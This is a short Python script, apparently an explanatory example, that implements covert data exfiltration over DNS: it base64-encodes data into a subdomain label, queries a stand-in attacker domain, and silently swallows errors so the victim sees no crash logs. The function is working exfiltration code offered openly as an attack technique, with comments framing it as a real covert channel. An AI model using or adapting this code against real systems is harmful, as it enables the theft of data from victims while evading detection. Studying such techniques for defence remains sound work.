import base64
import dns.resolver

# This is the fake domain where data is sent. 
# In a real attack, this would be a domain the attacker owns.
ATTACKER_DOMAIN = "test.google.com" 

def send_data_over_dns(data):
    try:
        # 1. Encode the data to Base64 (so it looks like random letters)
        # We perform URL-safe encoding and strip the '=' padding to make it a valid DNS label
        encoded_data = base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")
        
        # 2. Construct the target domain: <stolen_data>.attacker.com
        target_domain = f"{encoded_data}.{ATTACKER_DOMAIN}"
        
        print(f"[>] Sending Covert DNS: {target_domain}")
        
        # 3. Send the DNS Query (The actual exfiltration)
        # We use a short timeout because we don't actually care about the response, only sending the query.
        resolver = dns.resolver.Resolver()
        resolver.lifetime = 1 # 1 second timeout
        resolver.timeout = 1
        
        resolver.resolve(target_domain, "A")
        
    except Exception:
        # In a real covert channel, we expect errors (because the domain might not exist)
        # We pass silently so the victim doesn't see crash logs.
        pass
